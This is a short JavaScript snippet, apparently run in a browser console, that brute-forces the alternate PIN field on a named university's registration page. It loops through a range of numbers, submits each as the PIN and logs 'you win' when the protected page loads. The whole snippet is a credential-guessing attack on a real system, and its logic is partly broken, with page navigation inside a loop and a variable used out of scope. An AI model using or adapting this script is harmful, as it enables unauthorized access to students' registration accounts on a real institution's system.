function stuff (password) {
  if (document.getElementsByClassName('datadisplaytable').length > 0) {
    console.log('you win')
    console.log(i)
    // window.open('https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin')
  } else {
    document.getElementById('apin_id').value = password
    document.getElementsByTagName('form')[1].submit()
  }
}

function wait (ms) {
  let start = new Date().getTime()
  let end = start
  while (end < start + ms) {
    end = new Date().getTime()
  }
}

for (let i = 396250; i < 396265; i++) {
  this.document.location = 'https://ssbprd-banner.ecu.edu/DAD_PROD/bwskfreg.P_AltPin'
  console.log(i)
  wait(1000)
  stop = window.onload = stuff(i)
}
